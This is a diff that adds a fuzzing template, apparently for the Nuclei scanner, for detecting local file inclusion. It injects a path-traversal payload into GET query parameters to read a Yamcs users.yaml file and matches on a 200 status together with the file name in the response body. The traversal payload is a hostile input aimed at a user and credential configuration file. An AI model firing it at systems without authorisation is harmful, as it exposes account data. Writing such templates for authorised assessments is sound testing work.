@@ -1,0 +1,38 @@
+id: fuzz-local-file-inclusion
+
+info:
+  name: Local File Inclusion Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect Local File Inclusion vulnerabilities using a specified path traversal payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      lfi:
+        - "../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{lfi}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "users.yaml"  # Verify presence of the target file content in the response
+
+      - type: status
+        status:
+          - 200  # Check for a successful response indicating a potential LFI
